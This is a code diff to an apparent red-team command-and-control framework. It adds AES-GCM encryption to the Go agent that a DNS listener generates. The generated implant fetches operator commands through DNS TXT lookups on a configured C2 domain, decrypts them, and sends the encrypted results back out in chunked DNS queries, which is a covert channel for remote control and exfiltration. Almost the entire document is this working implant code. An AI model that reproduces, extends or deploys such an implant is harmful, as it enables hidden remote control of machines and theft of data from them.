@@ -1,4 +1,4 @@
-package dnsListener
+package encryptedDNSListener
 
 import (
 	"bytes"
@@ -15,20 +15,97 @@ import (
 	"golang.org/x/text/encoding/unicode"
 )
 
-func (d JaqenDNSListener) genGolangAgent() []byte {
+func (d JaqenEncryptedDNSListener) genGolangAgent() []byte {
 	//Thanks to moloch-- and the rosie project for figuring out how to do the generation stuff mostly good https://github.com/moloch--/rosie
 	dom, _ := d.GetOption("domain")
+	b64key, _ := d.GetOption("key")
 
 	codeStruct := server.AgentCode{
 
 		Imports: `*/	
+		"crypto/aes"
+		"crypto/cipher"
+		csrand "crypto/rand"
+		"encoding/base64"
 		"encoding/hex"
-		"os"
 		"fmt"
 		"net"
+		"os"
 		/*`,
 		GlobalVars: `
 		*/const payloadSizeMax = 62
+
+		func encrypt(plaintext, key []byte) ([]byte, error) {
+			block, e := aes.NewCipher(key)
+			if e != nil {
+				return []byte{}, e
+			}
+		
+			mode, e := cipher.NewGCM(block) //, iv)
+			ct := []byte{}
+		
+			iv, e := generateRandomBytes(mode.NonceSize())
+		
+			//mode.CryptBlocks(ct, []byte(plaintext))
+			ct = mode.Seal(nil, iv, []byte(plaintext), nil)
+		
+			ct = append(iv, ct...)
+			return ct, nil
+		}
+		
+		func generateRandomBytes(n int) ([]byte, error) {
+			b := make([]byte, n)
+			_, err := csrand.Read(b)
+			// Note that err == nil only if we read len(b) bytes.
+			if err != nil {
+				return nil, err
+			}
+		
+			return b, nil
+		}
+		
+		func decrypt(ct, key []byte) ([]byte, error) {
+			block, e := aes.NewCipher(key)
+			if e != nil {
+				return []byte{}, e
+			}
+		
+			mode, e := cipher.NewGCM(block) //, iv)
+			if e != nil {
+				return []byte{}, e
+			}
+			pt := []byte{}
+		
+			iv := ct[:mode.NonceSize()]
+			ct = ct[mode.NonceSize():]
+		
+			pt, e = mode.Open(nil, iv, ct, nil)
+			//mode.CryptBlocks(pt, ct)
+		
+			return pt, e
+		}
+		
+		func decryptToString(ct, key []byte) (string, error) {
+			pt, e := decrypt(ct, key)
+			if e != nil {
+				return "", e
+			}
+			return string(pt), nil
+		}
+		
+		func decryptHexStringToString(ct string, ekey string) (string, error) {
+			decodedCt, e := hex.DecodeString(ct)
+			if e != nil {
+				return "", e
+			}
+		
+			key, e := base64.StdEncoding.DecodeString(ekey)
+			if e != nil {
+				return "", e
+			}
+		
+			return decryptToString(decodedCt, key)
+		}
 /*
 `,
 		Checkin: `*/	
@@ -36,26 +113,37 @@ func (d JaqenDNSListener) genGolangAgent() []byte {
 		/*`,
 		Init: `*/	
 		a.settings.Set("c2Domain", "` + dom + `")
+		a.settings.Set("key", "` + b64key + `")
 		/*`,
 		GetCommand: `*/
 		cmdID := RandStringRunes(4)
 		lookupAddr := fmt.Sprintf("%s.%s.%s", cmdID, a.uid, a.settings.Get("c2Domain"))
 		command, err := net.LookupTXT(lookupAddr)
 		if err != nil {
-			panic(err)
+			os.Exit(0)
 		}
 	
-		a.cmd, a.cmdID = command[0], cmdID
+		scmd := strings.Join(command, "")
+		//decode and decrypt
+	
+		scmd, _ = decryptHexStringToString(scmd, a.settings.Get("key"))
+	
+		a.cmd, a.cmdID = scmd, cmdID
 	
 		if a.cmd != "NoCMD" {
 			return true
 		}
-		if a.cmd == "exit"{
+		if a.cmd == "exit" {
 			os.Exit(0)
 		}
 		/*`,
 		ExecCommand: `*//*`,
 		SendResponse: `*/	
+		k := a.GetSetting("key")
+		dk, _ := base64.StdEncoding.DecodeString(k)
+	
+		b, _ = encrypt(b, dk) //, iv)
+	
 		encodedResult := hex.EncodeToString(b)
 		blocks := len(encodedResult) / payloadSizeMax
 		leftover := len(encodedResult) % payloadSizeMax
@@ -63,6 +151,7 @@ func (d JaqenDNSListener) genGolangAgent() []byte {
 			blocks++
 		}
 	
+		fmt.Println(len(encodedResult), blocks, leftover)
 		for x := 1; x <= blocks; x++ {
 			minVal := (x - 1) * payloadSizeMax
 			maxVal := x * payloadSizeMax
@@ -184,7 +273,7 @@ type powershellagent struct {
 	Split  int
 }
 
-func (d JaqenDNSListener) genBashAgent() string {
+func (d JaqenEncryptedDNSListener) genBashAgent() string {
 	dom, _ := d.GetOption("domain")
 
 	spl := 60
@@ -221,7 +310,7 @@ func (d JaqenDNSListener) genBashAgent() string {
 	return buf.String()
 }
 
-func (d JaqenDNSListener) genPowershellAgent() string {
+func (d JaqenEncryptedDNSListener) genPowershellAgent() string {
 	dom, _ := d.GetOption("domain")
 
 	spl := 60
